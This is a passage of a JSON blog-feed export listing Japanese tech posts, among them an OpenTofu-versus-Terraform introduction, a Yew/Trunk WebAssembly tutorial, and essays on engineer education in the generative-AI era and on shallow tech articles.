GKEのカスタムコンピューティングク […]The post GKEのComputeClassに関する調査 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-07T00:00:00.000Z","dateMiliSeconds":1738886400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes History Inspector(KHI)を触ってみた","link":"https://speakerdeck.com/bells17/kubernetes-history-inspector-khi-wohong-tutemita","contentSnippet":"スライド内の参考リンク・画像など引用元一覧\\r\\rhttps://zenn.dev/bells17/scraps/67c852e99ad5a5 \\rhttps://github.com/GoogleCloudPlatform/khi \\rhttps://zenn.dev/google_cloud_jp/articles/9a7dc0df5e8906 \\rhttps://blog.g-gen.co.jp/entry/kubernetes-history-inspector-introduction \\rhttps://x.com/kyasbal_k/status/1884500133183905976 \\rhttps://x.com/ryusa_eng/status/1886328704432996463 \\rhttps://x.com/kkuchima/status/1884503826029228189 \\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-history.png\\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-views.png \\rhttps://k8s-novice-jp.connpass.com/event/343899/ \\rhttps://jaguer-cloud-native.connpass.com/event/342024/","isoDate":"2025-02-05T05:00:00.000Z","dateMiliSeconds":1738731600000,"authorName":"bells17","authorId":"bells17"},{"title":"mini.testでNeovimプラグインのテストに入門した","link":"https://blog.atusy.net/2025/02/05/mini-test-nvim/","contentSnippet":"以前書いた、Budouxを使ったWモーションをE/B/gEに対応させてプラグインにしようかなと思って、atusy/budouxify.nvimを作った。BudouxによりNeovimのWモーションを拡張し、日本語文章の区切りに移動させるhttps://blog.atusy.net/2024/12/27/nvim-budoux-motion/","isoDate":"2025-02-05T00:00:00.000Z","dateMiliSeconds":1738713600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"滅びゆく「なぜ？」と「どうして？」の学びをどう受け止めればよいのか？新人エンジニアの指導で感じる生成AI時代の指導の難しさ","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/04/203205","contentSnippet":"anond.hatelabo.jpこの記事を読み、その内容は学生だけでなく、ソフトウェアエンジニアの教育にも適用できると考えました。以下、ソフトウェアエンジニア（以降、技術者と表記）の教育について、私見を述べさせていただきます。はじめに新人エンジニアや学生のOJTやハンズオン研修を担当する中で日々実感することがあります。生成AIの台頭により従来の指導方法が大きく揺らいでいるという現実です。特に、表面的な成果物の質と実際の理解度の乖離が、技術者教育における新たな課題として浮き彫りになってきています。この変化は、技術教育に関わる私たち全員に、新たな挑戦と機会をもたらしています。生成AIは確かに技術教育の在り方を根本から問い直すきっかけとなりましたが、それは同時に、より本質的な技術力の育成について考え直す機会でもあります。技術の進化に伴う変化は不可避ですが、その中で私たちにできることは、この変化を前向きに捉え、新しい時代にふさわしい技術教育の形を模索していくことではないでしょうか。このような問題意識のもと、本稿では2025年に向けた技術者教育の新しいアプローチについて考察していきます。変化する学習の風景これまでの技術習得プロセスには、ある種の必然性がありました。ライブラリの使い方で躓き、設計パターンの意図を理解できず悩み、そしてそれらを一つずつ克服していく。この過程で、指導者は学習者の理解度を正確に把握し、適切なサポートを提供することができました。しかし、生成AIの登場により、この学習の構図が大きく変容しています。ある日の出来事が、この変化を象徴的に表していました。新人エンジニアに依頼した簡単なAPIの実装が、驚くほど短期間で、かつ高品質なコードとして提出されたのです。しかし、コードレビューの場での会話は、次のような展開となりました。「このミドルウェアの実装パターンを選択した理由は？」「はい...Copilotが提案したものをそのまま採用しました」「例外処理の設計思想については？」「申し訳ありません。その部分はAIの出力そのままで...」更に印象的だったのは、実装中のトラブルシューティングでの出来事でした。学生がハンズオン研修で詰まっていたため、私がエラーメッセージを確認して原因を特定し、問題のファイルを開こうとした瞬間、そのファイルは既にCopilotによって修正されました。本来であれば、エラーの原因を一緒に探り、解決策を考えることで、貴重な学びの機会となるはずでした。私たちはどう学んでいるのか　――創発から見る認知の変化 (ちくまプリマー新書)作者:鈴木宏昭筑摩書房Amazon理解を伴わない実装力技術者として、私自身も生成AIを積極的に活用しています。それは現代のソフトウェア開発において、もはや必須のスキルといえるでしょう。しかし、「理解を伴わない実装力」という新たな現象が、技術者教育に大きな課題を投げかけています。最近経験した出来事が、この課題を端的に表していました。新人エンジニアが実装したAPIは、一見すると申し分のない出来栄えでした。しかし、設計の意図を問うと「ChatGPTやCopilotの提案をそのまま採用した」という答えが返ってきます。エラーが発生した際も、その原因を一緒に探ろうとした矢先、Copilotが自動的に修正を施してしまう。こうした状況は、技術者としての本質的な成長機会を失わせる危険性をはらんでいます。具体的な例として、複雑なマイクロサービスアーキテクチャを構築できるのに、RESTful APIの基本原則が説明できない。網羅的なユニットテストを実装できるのに、テストピラミッドの考え方が理解できていない。Kubernetesのマニフェストが書けるのに、コンテナ化の利点を説明できない。このような状況が増えています。しかし、ここで注目すべきは「理解を伴わない実装力」にも異なるタイプが存在することです。生成AIに依存した実装を行うエンジニアと、知識はあるが実践との紐付けが発展途上のエンジニアです。前者は、高度なアーキテクチャのコードを書けるように見えても、その設計思想を説明できず、エラーが発生すると即座にAIに解決を委ねます。コードレビューでの「なぜ」という問いに対して、「AIが提案したから」や「はぁ？」という支離滅裂な回答に終始し、自身の実装に対する責任感や当事者意識が希薄です。一方後者は、デザインパターンやアーキテクチャの理論的理解はあるものの、それを実践に活かしきれていない段階にいます。しかし、レビューで指摘されると「あ、確かにそうですね」と納得し、エラーに直面しても自分なりの仮説を立てて解決を試みます。不完全でも自分の言葉で説明しようとする姿勢があり、試行錯誤を重ねながら、徐々に知識と実践を紐づけていっています。これまでの教育現場では、学習者の成長過程が自然と把握できていました。エラーメッセージと格闘し、設計パターンの意図を咀嚼し、少しずつ理解を深めていく。その過程で、「基礎概念は理解できている」「応用に課題がある」といった具合に、理解度の段階が明確だったのです。しかし今や、生成AIの支援により、理解度と実装力の相関が著しく弱まっています。特に前者のようなタイプの場合、表面的な成果物の品質だけでは、技術力を測ることが困難になっているのです。後者のような「知識はあるが実践が追いついていない」エンジニアの場合、時間とともに着実な成長が期待できますが、AIに依存した実装では、その成長機会自体が失われてしまう危険性があります。技術者教育の本質を見つめ直す私たちが目指すべきは、単なる「実装力」の向上ではありません。なぜその技術が必要とされるのか、どのような文脈で使用されるべきか、実装による影響をどう評価するか。そういった本質的な理解力を持つエンジニアの育成こそが重要です。「動くコード」を書けることは、技術者としての第一歩に過ぎません。技術力とは、技術選択の理由を説明できること、その技術がもたらす長期的な影響を予測できること、そしてプロジェクト全体における個々の実装の位置づけを理解できることです。これは単にコードを書けるということとは本質的に異なる能力です。syu-m-5151.hatenablog.comしかし、生成AIの存在は、この「理解のプロセス」を大きく変えつつあります。AIの出力を適切に編集することで「完成」にたどり着けてしまう現状は、技術習得における重要な学びの機会を奪っているかもしれません。エラーとの格闘、設計の試行錯誤、レビューでの指摘と修正—これらの経験は、表面的には非効率に見えても、実は技術者としての成長に不可欠なプロセスなのです。さらに重要なのは、技術の進化に対する適応力です。特定の実装パターンやツールの使い方を覚えることよりも、新しい技術が登場した際にその本質を理解し、適切に評価できる力を養うことが重要です。この適応力は、深い理解と経験に裏打ちされた「考える力」からしか生まれません。syu-m-5151.hatenablog.comこれからの技術者教育2025年に向けたエンジニア育成の新しいアプローチ1. 生成AIとの対話力を含めた包括的な技術教育カリキュラムの構築生成AIを効果的に活用するスキルそのものを技術教育の重要な要素として位置づける必要があります。AIへの適切なプロンプト作成能力はもはやエンジニアの基礎スキルとして不可欠です。しかし、ここで重要なのは単にAIに答えを求めることではありません。具体的には、AIに実装方針を提案させる際も、その根拠となる設計原則や参考文献を確認し、実装の背景にある理論や概念について理解を深めていく必要があります。さらに、特定の実装パターンのメリット・デメリットを比較検討させることで、技術選択の判断力を養うことができます。また、エラーが発生した際は、その原因と対処法についての理解を深めるための質問を重ねることで、問題解決力を育てていきます。つまり、AIを「答えを得るためのツール」ではなく、「理解を深めるための対話相手」として活用する姿勢が求められます。生成AIとの対話を通じて、技術の本質的な理解を深める習慣を身につけることが重要です。また、AIが出力したコードやドキュメントを適切に評価・検証する力も重要な要素となっています。プロンプトエンジニアリングの技術に加えて、AIと人間それぞれの得意分野を理解し、適切な役割分担ができる判断力が必要です。特に、AIの出力を鵜呑みにせず、常に批判的に検証し、その背景にある原理原則を理解しようとする姿勢を育むことが重要です。2. 実装スキルから設計思考力へのフォーカスシフトコーディングスキルの習得以上に、システム設計の原則や思想を理解することが重要になってきています。実装の詳細は生成AIに任せられる時代だからこそ、私たちはより本質的な設計思考力の育成に注力すべきです。システム設計において重要なのは、ビジネス要件を技術要件に適切に変換する力です。スケーラビリティ、可用性、保守性といった非機能要件をどのように満たすのか。開発効率と運用コストのバランスをどう取るのか。こうしたトレードオフを適切に判断し、プロジェクト全体の成功に導く力が、これからのエンジニアには求められます。個々の実装の詳細は生成AIにある程度任せられる一方で、システム全体を俯瞰する力は2025年においては人間にしか培えない能力なのです。この力を育むためには、実際のプロジェクトの中で判断が必要な場面に直面させ、その経験を積ませることが効果的です。例えば、新しい機能追加の要件を受けた際に、既存システムへの影響範囲を分析させたり、将来の拡張性を考慮した設計を検討させたりすることで、システム全体を見渡す視点を養うことができます。3. プロセスと思考を重視した評価方法への転換技術者の評価においても、成果物の完成度だけでなく、そこに至るまでの思考プロセスを重視する必要があります。なぜその設計を選択したのか、どのような代替案を検討したのか、想定されるリスクにどう対処するのか。こうした意思決定の過程とその根拠を、自分の言葉で説明できる力が極めて重要です。特に注目すべきは、長期的な視点での判断力です。目の前の実装だけでなく、その選択が将来的なシステムの保守性や拡張性にどのような影響を与えるのか。技術負債との向き合い方や、チーム全体での知識共有の方法など、持続可能な開発を実現するための視点も評価の重要な要素となります。この文脈で懸念されるのが、表面的な成果や「スムーズな進捗」を演出しようとする風潮です。これは特定の層に限った問題ではなく、現代の開発環境が生み出す構造的な課題といえます。重要なのは、そうした見せかけの生産性を求めない組織文化の醸成です。真摯な試行錯誤やチャレンジを認め、失敗から学ぶことを奨励する環境づくりこそが、本質的な技術力の向上につながります。結局のところ、私たちが目指すべきは、表面的な実装の速さや完成度ではなく、持続可能な開発を実現するための思考力と判断力を備えたエンジニアの育成なのです。そのためには、短期的な成果だけでなく、プロセスの質を重視する評価体系への転換が不可欠です。これは単なる評価方法の変更ではなく、組織全体で取り組むべき文化的な転換といえるでしょう。おわりに生成AI時代における技術者教育は、まさに過渡期にあります。単純な「できる/できない」の二元論では測れない、技術力をどう育成し、評価していくのか。これは私たち指導者自身にとっても、大きな学びの機会となっています。この課題に対する明確な解答は、業界全体としてもまだ模索段階にあります。しかし、技術教育の在り方を根本から見直し、新しい時代に適応した指導方法を確立していく必要性は明らかです。エンジニアの評価や育成に関する従来の常識は、生成AIの台頭により大きく揺らいでいます。多くの組織や教育機関が同様の課題に直面している中、重要なのは個々の取り組みや知見を共有し、業界全体として解決策を模索していく姿勢です。エンジニア育成は組織の壁を超えた共通の課題であり、オープンな対話と試行錯誤を通じてこそ、新しい時代にふさわしい技術教育の形が見えてくるのではないでしょうか。","isoDate":"2025-02-04T11:32:05.000Z","dateMiliSeconds":1738668725000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Terraform使いがOpenTofuについて入門してみる","link":"https://blog.masasuzu.net/entry/2025/02/04/185305","contentSnippet":"この記事はSRETT #11で発表されたものに加筆修正したものです。OpenTofuに関して調べたこととなります。3-shake SRE Tech Talk #11 オンサイト - connpass speakerdeck.com先日KubeCon + CloudNativeCon North America 2024に行ってきてました。その中で共同開催されていたOpenTofu Dayを見てOpenTofuに関して興味を持ちました。普段はTerraformを利用しており、あまりOpenTofuについては触ってきてないので、この機会に深堀りをしてみたいと思いました。参考: OpenTofu Dayまた、社内活動として技術検証を行っており、私の検証テーマとしてTerraformを中心としたIaC周りの技術調査を行ってるので、ちょうどいい機会だとも思いました。おことわりOpenTofuとはライセンス問題HashiCorp社の言い分コミュニティの懸念OpenTofuとTerraformの違いコマンドファイルRegistryremovedブロックState Encryptionbackendブロックの変数参照バージョン管理Security checkLinterCI/CDまとめ参考リンクライセンス変更フォークソースコード問題OpenTofuを使うためにHachiCorp買収おことわりこの記事はTerraformを知っている前提で書かれています。そのため細かい説明を省略している箇所があります。また筆者は普段はTerraformをメインで使用しており、OpenTofuを業務利用はしていません。OpenTofuとは2023年8月にTerraformを含めたHashiCorp製品のライセンスの変更を発表したことにより、これを懸念した企業やコミュニティによりOpenTFとしてフォークされます。その後OpenTFの名称はHashiCorp社の商標権への懸念からOpenTofuに改名されます。そのときの議論はissueを見るとたどることができます。参考: https://github.com/opentofu/opentofu/issues/2962023年9月にLinux Foundation傘下となります。参考: Linux Foundation Launches OpenTofu: A New Open Source Alternative to TerraformTerraformをフォークしたものなので基本的な使い勝手は同じです。コマンド名が terraform から  tofu に差し替えられています。ライセンス問題前項でさらっとライセンス変更と言いましたが、HashiCorp社は2023年8月に今後のリリースに関してライセンスを変更する旨を発表しました。これはオープンソースライセンスであるMozilla Public License（MPL） v2.0から商用サービスでの利用を制限するBusiness Source License（BUSLあるいはBSL） v1.1に変更するものです。参考: HashiCorp adopts Business Source Licenseこれに対して、利用企業およびコミュニティが懸念を示し、OpenTofuをフォークしたという流れになります。HashiCorp社の言い分従来BSLは本番使用(production use)が制限されます。ただし、ライセンスのParameterとして追加使用許可(Additional Use Grant)をすることによりTerraformと「競合製品」でなければ本番利用の制限はないとしてます。参考: https://github.com/hashicorp/terraform/blob/v1.11/LICENSE「競合製品」とは、有料サポート契約を含む第三者に販売される製品で、HashiCorp のライセンス対象製品の有料版の機能と大幅に重複する製品を指します。TerraformでいうところのHCP Terraform(Terraform Cloud)を想定しているのかと思います。また組織内でTerraformをホストして利用することは「競合製品」とはみなされなません。そのため利用者としては基本的には問題なく利用できるとしてます。参考: HashiCorp Licensing FAQ問題となるのはTerraformの機能を有償で提供しているSaaSと読み取れます。コミュニティの懸念HashiCorp社が説明したBSLと追加使用許可はあいまいであるとしてます。そのため、自身の行動が許諾範囲内か判断が困難である。「競合製品」の定義やライセンス自体が今後変更されるか不確実であると懸念を示してます。また、TerraformはOSSの恩恵を受けて成長してきてため、これからもオープンソースソフトウェアであるべきだと信じていると表明しています。参考: OpenTofu FAQOpenTofuのスポンサー企業としては以下のとおりです。HarnessGruntworkSpaceliftenv0ScalrHarnessはCI/CDまわりのSaaS製品、Gruntworksはterragruntの開発元、Specelift、env0、ScalrはTerraformをホストするSaaSサービスを運営しています。OpenTofuとTerraformの違いこの項ではそれぞれの違いについて説明していきます。OpenTofuはTerraform1.6-alphaからフォークされているのでそれまでに実装されていたものは互換があります。また、Terraform 1.6以降に追加された機能に関しても随時取り込まれています。そのため、1.5までの機能を使っているのであれば素直に移行できるかとは思います。バージョンごとに移行ガイドがあるので細かくはそれを参照すると良いです。参考: https://opentofu.org/docs/intro/migration/ただし、別のコードベースで開発がされているので、OpenTofuのみの独自実装もあります。ここではいくつか個人的に気になる違いについてあげていきます。コマンド基本的には terraform を tofuに置き換えていただければよいです。サブコマンドは一緒です。# Terraformterraform initterraform planterraform applyterraform destroy# OpenTofutofu inittofu plantofu applytofu destroyファイルterraform由来の .tf または .tofu の拡張子のファイルを設定ファイルとして認識します。json形式の .tf.json または .tofu.json の拡張子のファイルも同様です。同じディレクトリ内に.tf と .tofu の両方のファイルがあった場合、.tofu ファイルだけ認識して、.tf ファイルは無視されます。foo.tf  # <=== このファイルは無視されるfoo.tofuRegistryTerraform同様OpenTofuにもプロバイダーやモジュールのレジストリがあります。Terraform: https://registry.terraform.io/OpenTofu: https://registry.opentofu.orgOpenTofu Registryが登場したときに存在したTerraform Providerは反映されています。反映されていないものに関してもissueを立てれば反映されるようですhttps://github.com/opentofu/registryremovedブロックremovedブロックは既存のリソースを削除することなく、stateから削除することができます。それぞれ下記のように記述できます。下記の例ではAWSインスタンス自体は削除せず、stateから外すことを意図してます。# Terraformremoved {  from = aws_instance.example  lifecycle {    destroy = false  }}# OpenTofuremoved {  from = aws_instance.example}Terraformではlifecyleブロックでdestroy=falseの記述が必須です。参考: https://developer.hashicorp.com/terraform/language/resources/syntax#removing-resourcesOpenTofuではremovedブロックを書くだけで stateから削除されます。参考: https://opentofu.org/docs/language/resources/syntax/#removing-resourcesremovedブロックでやりたいことはstateから削除することなので、単純にリソースを削除したいなら対象resouceブロックを削除すればいいので、Terraformの記述方法のほうがへんな気がします。State EncryptionTerraformでは平文でStateに保存されてしまうという問題がありましたが、OpenTofuではクライアントサイドで暗号化する機能が追加されてます。クラウドプロバイダーの KMSキーなどを利用してStateを暗号化することができます。参考: State and Plan Encryption | OpenTofuTerraformではたとえsopsプロバイダーで機密情報を暗号化しても、Stateファイルには平文で保存されているので権限があれば機密情報が見えてしまう状態にありました。State自体が暗号化されることにより機密情報をよりセキュアに扱えるようになります。参考: Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか - 目の前に僕らの道があるbackendブロックの変数参照OpenTofuではbackendブロックで変数参照ができます参考: https://opentofu.org/docs/language/settings/backends/configuration/#variables-and-localsvariable \\"env\\" {  type    = string}locals {  path = \\"${var.env}/terraform.tfstate\\"}terraform {  backend \\"local\\" {    path = local.path  }}tofu init -var=\\"env=dev\\" -reconfiguretofu plan -var=\\"env=dev\\"Terraformで同じことをしたい場合、-backend-configを渡さないといけないため、backendを切り替える際に不便となります。terraform init -backend-config=./envs/dev/terraform.backend -reconfigureterraform plan -vars-file=./envs/dev/terraform.tfvarsOpenTofu DayのLTで紹介されてた環境名だけを渡して挙動を切り替えるパターンが現状だとterraformでは使えません参考:On Best Practices with OpenTofu Structuringバージョン管理複数プロジェクトでTerraform or OpenTofuを使う場合、プロジェクトごとに使用バージョンを管理する必要があります。いくつか選択肢を見ていきます。Terraformのバージョン管理ツールとしてよく使われるtfenvはOpenTofuには対応しません。参考:https://github.com/tfutils/tfenv/issues/409代わりにTerraformとOpenTofuに対応したtenvができました。こちらを利用すると良さそうです。https://github.com/tofuutils/tenv私はTerraformも合わせてプロジェクト内のツールのバージョン管理をまとめてasdfでやってますが、こちらは対応しています。https://github.com/virtualroot/asdf-opentofu自分はあまり使わないのですが、同じようなツールのaquaやmiseも両対応しています。https://aquaproj.github.io/https://github.com/jdx/miseSecurity checkTerraformだとtfsec(現 trivy config)がセキュリティチェックとして使われてるかと思います。ディスカッションはされており優先順位をつけて対応するとのことです。参考: https://github.com/aquasecurity/trivy/discussions/5069LintertflintはOpenTofuをサポートしないようです。参考: https://github.com/terraform-linters/tflint/issues/2037Linterの議論自体はissueで続いているようです。参考: https://github.com/opentofu/opentofu/issues/2213CI/CDHCP Terraform(旧Terraform Cloud)に相当するSaaSとしては、OpenTofuスポンサーのSpacelift、env0、Scalrなどがあります。tfactions、atlantis、diggerもOpenTofuに対応している模様です。まとめ現時点でOpenTofuに移行するするべきか?の問については、利用者側として現状では引き続き様子見かと思います。足回りも概ね揃ってきているが、まだ足りないエコシステムもあります。気になるところではIBM社にHashiCorp社の買収による統合完了の様子も追っていきたいところです。予定では2025年の1-3月期に統合完了するとのことなので、その後なにか動きがあるかもしれません。参考: IBM社によるHashiCorp社買収についてとはいえ、1つのツールが使えなくなることで業務が止まるのは避けたいので常に選択肢は複数取っておきたいところです。エンジニアとしてはOpenTofuに限らず、Pulumi、CDK(AWS)なども選択肢として取っておきたいです。それはそれとして、OpenTofuはTerraformとは違う独自進化をしているので、変更を追っていきたいところです。個人的にはState暗号化とかBackendの変数参照とかTerraformに入ってほしいです。それでは良い豆腐ライフを!、、、。ここまで書いてきたのですが、minamijoyoさんのTerraform職人のためのOpenTofu再入門2024がものすごく詳しいので、この記事以上に参考になるかと思います。参考リンクライセンス変更HashiCorp adopts Business Source LicenseHashiCorp | The Infrastructure Cloud CompanyHashiCorp、全製品のライセンスを商用利用に制限があるBSLライセンスに変更すると発表 － PublickeyTerraformのライセンスの変更とその影響何故、TerraformのBUSL-1.1へのライセンス変更は反発を受けたのか？ – Shuji SadoTerraform のライセンス変更についての考察 #Azure - QiitaフォークTerraformのフォークが「OpenTofu」としてLinux Foundation傘下で正式ローンチ。OpenTFから改名 － Publickeyソースコード問題【Infostand海外ITトピックス】ライセンスをめぐって対立　HashiCorpと「Terraform」派生のOpenTofu - クラウド WatchHashiCorp、TerraformをフォークしたOpenTofuに対しコードの不正コピーを警告。OpenTofuは完全否定 － PublickeyOpenTofuを使うためにTerraform職人のためのOpenTofu再入門2024 #Terraform - QiitaTerraform職人のためのOpenTofu入門 #Terraform - QiitaOpenTofuopentofu/opentofu: OpenTofu lets you declaratively manage your cloud infrastructure.Migrating to OpenTofu 1.7.x from Terraform | OpenTofuHachiCorp買収IBMがHashiCorpを64億ドルで買収、TerraformとAnsibleのシナジー効果などを見込む | IT LeadersIBM Japan Newsroom - ニュースリリースIBM社によるHashiCorp社買収について","isoDate":"2025-02-04T09:53:05.000Z","dateMiliSeconds":1738662785000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"スリーシェイク、「Developers Summit 2025」にて出展・登壇、および書籍「Kubernetesで実践するPlatform Engineering」の先行販売・サイン会を実施","link":"https://sreake.com/blog/developers-summit-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025年2月13日（木）・14日（金）に開催される「Developers Summit 2025」にSRE総合支援サービス「Sreake（スリーク）」のブースを出展します。The post スリーシェイク、「Developers Summit 2025」にて出展・登壇、および書籍「Kubernetesで実践するPlatform Engineering」の先行販売・サイン会を実施 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-04T01:00:00.000Z","dateMiliSeconds":1738630800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"技術記事のレベル低下は誰のため？ - 楽して学べる幻想と戦うためにもしくはバズるという快楽に対する防衛術","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/04/094857","contentSnippet":"はじめにバズっている技術ブログやSNSの投稿を見ていて「今さらこんな基本的なTipsが数千いいねされるのか」と感じることはありませんか。「とりあえずDockerを使ってみよう」「React超入門」といった手取り足取り系の投稿がバズり続け、タイムラインには毎日のように初心者向けコンテンツが流れています。同じような入門記事が異なる執筆者によって際限なく生み出されるこの状況は、技術情報の共有における興味深い現象と言えるでしょう。では、なぜこのような現象が続いているのでしょうか。「学習」に対する一般的な認識多くの普通の人にとって「学習」は快適な体験であるべきだという認識があります。自分が理解できる範囲の内容を読み、既存の知識と結びつけて徐々に理解を深めていく。分からないことがあれば基礎的な内容に立ち返る。実際、人間の脳は安全な環境で学習することを好む傾向にあり、多くの人は「コンフォートゾーン」の中で学習を進めていきたいという自然な欲求を持っています。これは特に新しい技術やプログラミングのような複雑な分野においても顕著に表れます。このような学習パターンは、人間の認知的な特性とも合致しています。新しい情報は、既存の知識体系の中に無理なく組み込めるときに最も効果的に定着するからです。そのため、急激な学習曲線や理解が追いつかない内容は、多くの人にとってストレス要因となり、学習意欲を低下させる原因となり得ます。自己啓発の教科書　禁欲主義からアドラー、引き寄せの法則まで作者:アナ・カタリーナ・シャフナー日経ナショナル ジオグラフィックAmazon現実の技術学習との乖離しかし実際の技術習得のプロセスはもっと異なるものです。理解できない内容を何度も読み返し、エラーと格闘しながら少しずつ理解を積み重ねていく必要があります。分からない用語を調べながら文脈を理解していくという地道な作業が求められます。時には数時間かけてもエラーが解決できず、徹底的にドキュメントを読み込んだり、ソースコードを追いかけたりする忍耐も必要です。このような現実の学習プロセスは、多くの人が求める「快適な学習体験」とは大きくかけ離れています。つまり、技術習得には「コンフォートゾーン」を意図的に離れ、混乱や不確実性と向き合う覚悟が必要なのです。このギャップこそが「お手軽入門記事」が無限に生産され続ける根本的な理由の一つと言えるでしょう。人々は常により優しい入り口、より分かりやすい説明を求め続けているのです。私たちはどう学んでいるのか　――創発から見る認知の変化 (ちくまプリマー新書)作者:鈴木宏昭筑摩書房Amazon需要と供給の関係バズっている技術ブログやSNSでは特徴的な循環が生まれています。チュートリアル的なコンテンツへの大きな需要があり、入門記事の方が読者数やフォロワーを獲得しやすい傾向にあります。複雑な技術解説や深い考察よりも、「とりあえず動くものを作る」といった実践的なコンテンツの方が、圧倒的に高いエンゲージメントを得られるのです。このような状況下では、執筆者もまた市場原理に従わざるを得ません。高度な技術記事を書いても読者が少なければ、自然と入門コンテンツにシフトしていくでしょう。結果として、さらに多くの基礎的なハウツー記事が生み出され、SNSのタイムラインを埋め尽くしていく循環が続いています。これは技術情報の生態系における一種の「自然淘汰」とも言えるかもしれません。上級者向けコンテンツの価値と課題上級者向けコンテンツには確かに大きな価値があります。業界全体の技術力向上に貢献し、特定の問題に対する深い洞察を共有することで、エンジニアとしてのキャリアアップにも役立ちます。しかしこれらのコンテンツは必然的に読者層が限定されます。前提知識が必要で理解に時間がかかり、即座に実践できない場合が多いためです。視点の多様性と技術記事の価値重要な点として、技術記事の「難易度」は極めて相対的です。ある人にとっての入門記事が、別の人にとっては上級者向けのコンテンツとなるという状況は珍しくありません。私たちは往々にして自分の知識レベルをベースラインとして記事の価値を判断しがちですが、技術学習においてはそれぞれが異なる文脈や背景を持っているのです。この認識は、技術記事を書く際の重要な視点となります。プラットフォームと個人の戦略技術記事プラットフォームにはトレンドとは別に普遍的な価値を持つ記事が確実に存在します。分散システムの設計原則やスケーラビリティの考察、セキュリティアーキテクチャの分析など、時代を超えて参照される価値のある記事です。しかしそれらの記事はトレンド入りしづらく、時として埋もれてしまいます。質の高い技術記事が、読者の多様な技術レベルや興味に応じて適切に届けられる仕組みづくりがプラットフォーム側には求められています。一方で個人の執筆戦略としては、より包括的なアプローチが有効です。時にはトレンドに乗った入門記事を書きつつ、自分の技術的な知見や経験を活かした深い考察も定期的に発信していく。理想的な技術ブログの運営には、読者の多様性を意識したバランスが重要です。入門的なコンテンツから実践的な応用記事、さらにはアーキテクチャ設計や性能改善といった本質的な議論まで、幅広い層に価値を提供することができます。このような多層的なアプローチは、技術コミュニティ全体の成長に貢献します。それぞれの記事が、異なる段階にいる読者にとって「次のステップ」となる可能性を持っているからです。執筆者は自身の経験を共有しながら、同時に読者それぞれの文脈での学びをサポートすることができるのです。Science Fictions　あなたが知らない科学の真実作者:スチュアート・リッチーダイヤモンド社Amazonまとめ表層的な入門記事が無限に存在する現状は決して悪いことではありません。むしろそれは多くのエンジニアが学習意欲を持っている証であり、業界の健全性を示すものとも言えます。執筆者としては読者の「コンフォートゾーン」を少しずつ広げていけるような段階的な難易度設定と丁寧な説明を心がけることが重要でしょう。そうすることで読者の成長を支援しながら、技術コミュニティ全体の発展に貢献できるはずです。アメリカは自己啓発本でできている作者:尾崎俊介平凡社Amazon","isoDate":"2025-02-04T00:48:57.000Z","dateMiliSeconds":1738630137000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"WebAssembly を開発する為にTrunkビルドツールを試してみました。","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/01/120804","contentSnippet":"はじめにWebAssemblyの進化により、RustでWebアプリケーションを構築する機会が増えています。特にYewフレームワークは、React風の使い勝手とRustの堅牢性を組み合わせた開発が可能です。本記事では、Yewアプリケーション開発をスムーズにするビルドツールTrunkについて、セットアップから実践的なテクニックまで解説します。yew.rsTrunkとはTrunkは、WebAssemblyアプリケーションに特化したビルドツールです。そして、以下のような特徴を持ちます。ホットリロードによる高速な開発体験アセット管理の自動化（画像、CSS、その他静的ファイル）最小限の設定で開発環境の構築が可能プロダクションビルドの最適化機能trunkrs.dev環境構築まず、必要なツールをインストールします：# WebAssemblyターゲットの追加rustup target add wasm32-unknown-unknown# Trunkのインストールcargo install trunktrunkrs.devプロジェクトの作成以下のコマンドで新規プロジェクトを作成します：cargo new yew-appcd yew-appCargo.tomlに必要な依存関係を追加：[dependencies]yew = { git = \\"https://github.com/yewstack/yew/\\", features = [\\"csr\\"] }yew.rsシンプルなカウンターアプリの実装src/main.rsにカウンターアプリのコードを実装します：use yew::prelude::*;#[function_component(App)]fn app() -> Html {    let counter = use_state(|| 0);    let onclick = {        let counter = counter.clone();        move |_| {            let value = *counter + 1;            counter.set(value);        }    };    html! {        <div>            <button {onclick}>{\\"+1\\"}</button>            <p>{ *counter }</p>        </div>    }}fn main() {    yew::Renderer::<App>::new().render();}yew.rsHTMLテンプレートの準備index.htmlをプロジェクトルートに作成：<!DOCTYPE html><html>    <head>        <meta charset=\\"utf-8\\" />        <title>Yew Counter App</title>    </head>    <body></body></html>開発サーバーの設定と起動Trunk.tomlで開発サーバーの設定をカスタマイズできます：[serve]# 開発サーバーのアドレスaddress = \\"127.0.0.1\\"# ポート番号port = 8080# アセットディレクトリassets = [\\"public\\"]# プロキシ設定（APIサーバーなど）[[proxy]]backend = \\"http://localhost:3000/api/\\"開発サーバーを起動：trunk serve --openこれでhttp://localhost:8080にアプリケーションが立ち上がります。アセット管理のベストプラクティス静的ファイルはpublicディレクトリで管理します：public/  ├── images/      # 画像ファイル  ├── styles/      # CSSファイル  ├── fonts/       # フォントファイル  └── favicon.ico  # ファビコンtrunkrs.devプロダクションビルドの最適化本番環境向けのビルドでは、以下の最適化が可能です：# リリースビルドtrunk build --release# WebAssemblyコードの最適化trunk build --release --filehashデバッグとトラブルシューティング開発中によくあるトラブルの対処法：ビルドエラー時はtrunk cleanでキャッシュをクリアアセットが反映されない場合はtrunk serve --watchで監視を強化WebAssemblyのデバッグには開発者ツールのConsoleを活用(フロントエンド開発初心者で学びが多かった⋯)おわりにTrunkを活用することで、Yewアプリケーションの開発体験が大幅に改善されます。特にホットリロードとアセット管理の自動化は、開発効率を向上させる重要な機能です。参考リンクTrunk GitHubYew GitHubWebAssembly","isoDate":"2025-02-01T03:08:04.000Z","dateMiliSeconds":1738379284000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"2025-01-31 吉祥寺.pm 37 